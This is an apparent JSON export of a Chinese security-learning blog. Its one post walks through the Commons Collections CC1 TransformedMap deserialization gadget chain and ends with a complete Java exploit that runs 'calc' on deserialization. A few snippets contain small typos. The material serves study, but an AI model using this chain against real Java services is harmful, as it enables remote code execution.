{"meta":{"title":"n1utra's blog","subtitle":"","description":"网络安全","author":"n1utra","url":"http://example.com","root":"/"},"pages":[{"title":"","date":"2025-07-06T15:25:15.315Z","updated":"2025-07-06T15:25:15.315Z","comments":true,"path":"about/index.html","permalink":"http://example.com/about/index.html","excerpt":"","text":"一个用来记录自己学习过程的博客。"},{"title":"所有分类","date":"2025-06-21T19:52:31.922Z","updated":"2025-06-21T19:52:31.922Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""},{"title":"所有标签","date":"2025-06-21T19:53:20.497Z","updated":"2025-06-21T19:53:20.497Z","comments":true,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""},{"title":"我的朋友们","date":"2025-06-21T19:53:14.776Z","updated":"2025-06-21T19:53:14.776Z","comments":true,"path":"friends/index.html","permalink":"http://example.com/friends/index.html","excerpt":"","text":"暂时没有朋友：）"}],"posts":[{"title":"CC链1-TransformedMap","slug":"CC链1-TransformedMap","date":"2025-07-06T15:26:15.000Z","updated":"2025-07-08T13:47:21.320Z","comments":true,"path":"2025/07/06/CC链1-TransformedMap/","permalink":"http://example.com/2025/07/06/CC%E9%93%BE1-TransformedMap/","excerpt":"","text":"CC链1-TransformedMapCC链1存在两条链，这里先说TransformedMap这一条 执行点：InvokerTransformer在InvokerTransformer这个类中，存在一个transform方法，接收一个类文件，然后进行反射调用 1234567891011121314151617public Object transform(Object input) &#123; if (input == null) &#123; return null; &#125; try &#123; Class cls = input.getClass(); Method method = cls.getMethod(iMethodName, iParamTypes); return method.invoke(input, iArgs); &#125; catch (NoSuchMethodException ex) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; does not exist&quot;); &#125; catch (IllegalAccessException ex) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; cannot be accessed&quot;); &#125; catch (InvocationTargetException ex) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; threw an exception&quot;, ex); &#125;&#125; 其中的iMethodName、iParamTypes等参数，来自于这个类的构造文件 123456public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123; super(); iMethodName = methodName; iParamTypes = paramTypes; iArgs = args;&#125; 也就是说这个反射代码的所有参数都可以进行控制，只要能传入指定参数就能够实现任意代码执行。构造如下代码，运行成功弹出计算器 123456public class CC1TransformedMap &#123; public static void main(String[] args) &#123; InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;); invokerTransformer.transform(Runtime.getRuntime()); &#125;&#125; 调用点1：TransformedMap查找关于transform方法的调用，在TransformedMap这个类中找到一处可利用的调用点 123protected Object checkSetValue(Object value) &#123; return valueTransformer.transform(value);&#125; 如果能够将valueTransformer设置为InvokerTransformer，参数传递为Runtime.getRuntime,那么就能够执行到我们的代码。 查找valueTransformer的赋值，是来自于构造函数 12345protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123; super(map); this.keyTransformer = keyTransformer; this.valueTransformer = valueTransformer;&#125; 这里的构造函数接收三个参数，一个Map和两个Transformer。但是这个构造函数是被protected修饰，表示只能被当前类或父子类进行调用，查找这个构造方法的调用点，找到一个decorate方法 123public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123; return new TransformedMap(map, keyTransformer, valueTransformer);&#125; 接收参数，然后返回一个TransformedMap类的实例 构造一个TransformedMap实例，构造一个Map集合传入，keyTransformer参数不需要，传入null即可。valueTransformer的位置传入构造的invokerTransformer 12345678910public class CC1TransformedMap &#123; public static void main(String[] args) &#123; InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;); //invokerTransformer.transform(Runtime.getRuntime()); HashMap&lt;Object, Object&gt; hMap = new HashMap&lt;&gt;(); hMap.put(&quot;key&quot;, &quot;value&quot;); Map decorate = TransformedMap.decorate(hmap, null, invokerTransformer); &#125;&#125; 此时调用获取的decorate对象的checkSetValue方法并传入参数，但是这个方法也是protected修饰，也是只能被当前类或父子类进行调用，继续查找调用。 调用点2：AbstractInputCheckedMapDecorator查找checkSetValue调用只有一处，位于AbstractInputCheckedMapDecorator类的setValue方法中，这个类是TransformedMap类的父类，这个方法位于MapEntry这个内部静态类中 123456789101112131415static class MapEntry extends AbstractMapEntryDecorator &#123; /** The parent map */ private final AbstractInputCheckedMapDecorator parent; protected MapEntry(Map.Entry entry, AbstractInputCheckedMapDecorator parent) &#123; super(entry); this.parent = parent; &#125; public Object setValue(Object value) &#123; value = parent.checkSetValue(value); return entry.setValue(value); &#125;&#125; 那么这里我们应该如何赋值并调用呢？直接问AI 这个类是一个装饰器，对原本Map.Entry进行包装修饰增强，其实就是遍历Map集合，一个Entry就是Map集合中的一个键值对，按照提示构造代码，能够弹出计算器 1234567891011121314public class CC1TransformedMap &#123; public static void main(String[] args) &#123; InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;); //invokerTransformer.transform(Runtime.getRuntime()); HashMap&lt;Object, Object&gt; hMap = new HashMap&lt;&gt;(); hMap.put(&quot;key&quot;, &quot;value&quot;); Map decorate = TransformedMap.decorate(hMap, null, invokerTransformer); for(Object object : decorate.entrySet()) &#123; Map.Entry entry = (Map.Entry) object; // 这里 setValue 会触发 invokerTransformer 的 transform 方法 entry.setValue(Runtime.getRuntime()); &#125; &#125;&#125; 这里为什么遍历就能过执行到内部类中的setValue方法？简单来说，TransformedMap继承了AbstractInputCheckedMapDecorator类，这个类重写了entrySet方法，最后返回的就是AbstractInputCheckedMapDecorator的MapEntry 我们继续查找AbstractInputCheckedMapDecorator类中内部类MapEntry的setValue方法的调用 反序列化入口：AnnotationInvocationHandler查找setValue调用时，在AnnotationInvocationHandler类中找到了调用点，位于readObject方法中，能够直接作为反序列化起点使用，并且正好在进行处于遍历的过程中 123456789101112131415161718192021222324252627282930313233private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException &#123; s.defaultReadObject(); // Check to make sure that types have not evolved incompatibly AnnotationType annotationType = null; try &#123; annotationType = AnnotationType.getInstance(type); &#125; catch(IllegalArgumentException e) &#123; // Class is no longer an annotation type; time to punch out throw new java.io.InvalidObjectException(&quot;Non-annotation type in annotation serial stream&quot;); &#125; Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes(); // If there are annotation members without values, that // situation is handled by the invoke method. for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123; String name = memberValue.getKey(); Class&lt;?&gt; memberType = memberTypes.get(name); if (memberType != null) &#123; // i.e. member still exists Object value = memberValue.getValue(); if (!(memberType.isInstance(value) || value instanceof ExceptionProxy)) &#123; memberValue.setValue( new AnnotationTypeMismatchExceptionProxy( value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember( annotationType.members().get(name))); &#125; &#125; &#125;&#125; 在这里只要控制memberValue为Invokertransformer，给setValue传入参数Runtime.getRuntime，就能进行命令执行 这里的memberValue是对memberValues遍历获取的键值对，来自于memberValues，也就说控制memberValues为构造的TransformedMap集合，就能够执行到漏洞代码。而memberValues是通过构造函数进行赋值的，所以这里先新建这个对象。 但是这个类没有修饰符，即默认为default修饰，这表示只允许当前包中调用 所以这里选择反射进行调用赋值。查看构造函数中的参数，第一个是一个继承了注解类的Class类，即需要一个注解的Class。第二个参数是一个Map集合，这里就传入我们构造的TransformedMap 12345678910111213141516171819public class CC1TransformedMap &#123; public static void main(String[] args) throws Exception &#123; InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;); //invokerTransformer.transform(Runtime.getRuntime()); HashMap&lt;Object, Object&gt; hMap = new HashMap&lt;&gt;(); hMap.put(&quot;key&quot;, &quot;value&quot;); Map decorate = TransformedMap.decorate(hMap, null, invokerTransformer); //for(Object object : decorate.entrySet()) &#123; // Map.Entry entry = (Map.Entry) object; // // 这里 setValue 会触发 invokerTransformer 的 transform 方法 // entry.setValue(Runtime.getRuntime()); //&#125; Class&lt;?&gt; annotationInvocationHandler = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor&lt;?&gt; annotationConstructor = annotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class); annotationConstructor.setAccessible(true); Object o = annotationConstructor.newInstance(Target.class, decorate); &#125;&#125; 这里对这个对象o进行序列化和反序列化是否能够实现命令执行呢？答案是不能，这里还存在三个问题： Runtime类没有实现序列化接口，所以传入的Runtime.getRuntime无法进入序列化流程 setValue的参数不能控制为我们想要传入的参数 readObject方法中还存在两个if判断，需要绕过 解决问题1：反射解决Runtime无法序列化既然无法直接序列化Runtime，那么就通过反射进行赋值操作，这里直接采用InvokerTransformer类进行赋值反射操作 123456789101112131415161718192021public class CC1TransformedMap&#123; public static void main(String[] args) throws Exception&#123; Object getMethod = new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;).transform(Runtime.Class); Object invoke = new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;).transform(getMethod); InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;); HashMap&lt;Object, Object&gt; hMap = new HashMap(); hMap.put(&quot;key&quot;, &quot;value&quot;); Map&lt;Object, Object&gt; decorate = TransformedMap.decorate(hMap, null, invokerTransformer); //for (Object obj : decorate.entrySet()) &#123; // Map.Entry entry = (Map.Entry) obj; // // 这里 setValue 会触发 invokerTransformer 的 transform 方法 // entry.setValue(Runtime.getRuntime()); //&#125; Class&lt;?&gt; annotationInvocationHandler = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor&lt;?&gt; annotationConstructor = annotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class); annotationConstructor.setAccessible(true); Object o = annotationConstructor.newInstance(Target.class, decorate); &#125; 可以看到这里执行了很多相同的新建InvokerTransformer并执行了transform方法，可以通过ChainsTransformer类进行优化，这个类构造函数接收一个Transformer数组，然后它的transform方法接收一个参数，数组中第一个transformer通过transform方法接收这个参数，并将执行结果作为参数传入第二个transformer中 构造代码，此时如果我们调用chainedTransformer.transform(Runtime.class)就成功执行代码，就说明这里的构造没有问题。 1234567891011121314151617181920public class CC1TransformedMap&#123; public static void main(String[] args) throws Exception&#123; Transformer[] transformers = new Transformer[]&#123; new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); // chainedTransformer.transform(Runtime.class)； HashMap&lt;Object, Object&gt; hMap = new HashMap(); hMap.put(&quot;key&quot;, &quot;value&quot;); Map&lt;Object, Object&gt; decorate = TransformedMap.decorate(hMap, null, chainedTransformer); Class&lt;?&gt; annotationInvocationHandler = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor&lt;?&gt; annotationConstructor = annotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class); annotationConstructor.setAccessible(true); Object o = annotationConstructor.newInstance(Target.class, decorate); &#125; 解决问题2：setValue参数无法控制这里调用setValue方法其实就是在调用transform方法，其中的参数最后会传递到transform方法中。 但是这里参数无法控制，应该怎么传入我们想要的值呢？ 这里就要引入一个ConstantTransformer类，这个类的transform方法接收任意参数都只会返回iConstant，然而iConstant是构造方法中进行赋值的，也就是说只要实例化这个类时传入构造函数的参数为Runtime.class，无论transform接收到什么参数，都只会返回Runtime.class 1234567891011121314151617181920public class CC1TransformedMap&#123; public static void main(String[] args) throws Exception&#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); // chainedTransformer.transform(Runtime.class)； HashMap&lt;Object, Object&gt; hMap = new HashMap(); hMap.put(&quot;key&quot;, &quot;value&quot;); Map&lt;Object, Object&gt; decorate = TransformedMap.decorate(hMap, null, chainedTransformer); Class&lt;?&gt; annotationInvocationHandler = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor&lt;?&gt; annotationConstructor = annotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class); annotationConstructor.setAccessible(true); Object o = annotationConstructor.newInstance(Target.class, decorate);&#125; 假如当执行到setValue时，传入的参数是1，就相当于chainedTransformer的transform方法接收到了一个1，然后传递给Transformer数组中的第一个Transformer的transform方法，即ConstantTransformer的transform，最后返回了Runtime.class。再将这个结果传递给第二个Transformer的transform方法作为参数，成功绕过了setValue无法控制的问题。 解决问题3：绕过if判断第一个判断第一个判断是if (memberType != null) &#123; 判断memberType 是否为空 memerType的构造大概如下： 123456Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123; String name = memberValue.getKey(); Class&lt;?&gt; memberType = memberTypes.get(name); ......&#125; annotationType.memberTypes();中annotationType来自于构造方法接收的注解类，这里大概就是获取传入注解类的成员属性和类型，返回为一个Map集合 String name = memberValue.getKey();：其中memberValue是遍历memberValues是的每一个键值对，这个memberValues也是来自于构造方法接收的参数，也就是我们构造的hMap集合，然后遍历时获取其中键值对的键名。 Class&lt;?&gt; memberType = memberTypes.get(name);：这里就是获取注解类中为hMap键名的值 那么第一个判断其实就是在判断hMap的键名是否是传入的注解类中的一个成员属性名，如果是就进入判断。所以这里就要满足两个条件： 传入的注解类存在成员属性 hMap集合的key要设置为这个注解类的成员属性名 我们这里传入的注解类是Target，查看这个类，正好存在一个成员属性value 所以接下来需要将hMap的键名设置为value即可 1234567891011121314151617181920212223242526272829public class CC1TransformedMap&#123; public static void main(String[] args) throws Exception&#123; Object getMethod = new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;).transform(Runtime.class); Object invoke = new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;).transform(getMethod); InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;); Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap&lt;Object, Object&gt; hMap = new HashMap(); hMap.put(&quot;value&quot;, &quot;aaa&quot;); Map&lt;Object, Object&gt; decorate = TransformedMap.decorate(hMap, null, chainedTransformer); Class&lt;?&gt; annotationInvocationHandler = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor&lt;?&gt; annotationConstructor = annotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class); annotationConstructor.setAccessible(true); Object o = annotationConstructor.newInstance(Target.class, decorate); &#125;&#125; 第二个判断第二个判断是：if (!(memberType.isInstance(value) || value instanceof ExceptionProxy))，简单来说这里就是在判断hMap的value是否是某个实例，如果不是就进入判断。 我们这里传入的是一个随机字符串，不用处理就能够直接进入这一层的if 最终利用链根据上面的思路构造的利用链如下，此时执行反序列化就能够实现任意命令，这里是弹出计算器 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667package com.example;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.annotation.Target;import java.lang.reflect.Constructor;import java.lang.reflect.Method;import java.util.HashMap;import java.util.Map;public class CC1TransformedMap&#123; public static void main(String[] args) throws Exception&#123; Object getMethod = new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;).transform(Runtime.class); Object invoke = new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;).transform(getMethod); InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;); Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap&lt;Object, Object&gt; hMap = new HashMap(); hMap.put(&quot;value&quot;, &quot;aaa&quot;); Map&lt;Object, Object&gt; decorate = TransformedMap.decorate(hMap, null, chainedTransformer); //for (Object obj : decorate.entrySet()) &#123; // Map.Entry entry = (Map.Entry) obj; // // 这里 setValue 会触发 invokerTransformer 的 transform 方法 // entry.setValue(Runtime.getRuntime()); //&#125; Class&lt;?&gt; annotationInvocationHandler = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor&lt;?&gt; annotationConstructor = annotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class); annotationConstructor.setAccessible(true); Object o = annotationConstructor.newInstance(Target.class, decorate); //serialize(o); unserialize(&quot;ser.bin&quot;); &#125; public static void serialize(Object object) throws Exception &#123; ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(object); &#125; public static Object unserialize(String fileName) throws Exception &#123; ObjectInputStream ois = new ObjectInputStream(new FileInputStream(fileName)); Object obj = ois.readObject(); return obj; &#125;&#125; 流程图","categories":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"http://example.com/categories/JAVA%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"http://example.com/tags/JAVA%E5%AE%89%E5%85%A8/"},{"name":"CC链","slug":"CC链","permalink":"http://example.com/tags/CC%E9%93%BE/"}]}],"categories":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"http://example.com/categories/JAVA%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"http://example.com/tags/JAVA%E5%AE%89%E5%85%A8/"},{"name":"CC链","slug":"CC链","permalink":"http://example.com/tags/CC%E9%93%BE/"}]}